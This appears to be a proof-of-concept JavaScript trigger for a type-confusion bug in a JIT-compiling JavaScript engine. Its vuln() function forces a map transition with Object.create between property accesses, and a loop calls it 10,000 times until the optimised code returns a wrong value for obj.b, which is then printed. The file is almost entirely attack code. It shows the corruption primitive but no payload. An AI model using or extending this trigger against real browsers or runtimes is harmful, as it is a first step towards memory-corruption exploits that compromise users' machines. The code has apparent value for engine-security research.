var iWantToTriggerTypeConfusion = 10000
var typeConfused = 0

function vuln(obj) {
    // Access Property a of obj, forcing a CheckMap operation
    obj.a;

    // Force a Map Transition via our side-effect
    Object.create(obj)

    // Trigger our type-confusion by accessing an out-of-bound property
    return obj.b;
}

function obj_returns_0() {
    obj = { a:0x42, b:0x43  }
    return obj
}

function obj_returns_2() {
    obj = { a:0x42  }
    obj.b = 0x43
    return obj
}

function obj_returns_3() {
    obj = { a:0x42  }
    obj.b = 0x43
    obj.c = 0x44
    return obj
}

function obj_returns_4() {
    obj = { a:0x42, a1: 0x41 }
    obj.b = 0x43
    obj.c = 0x44
    return obj
}

for (let i = 0; i < iWantToTriggerTypeConfusion; i++) {
    ret = vuln(obj_returns_4());
    if (ret !== 0x43) {
        typeConfused = 1
        break
    }
}

if (typeConfused === 1) {
    print("Returned: " + ret)
}

if (typeConfused === 0) {
    print("Type confusion failed")
}
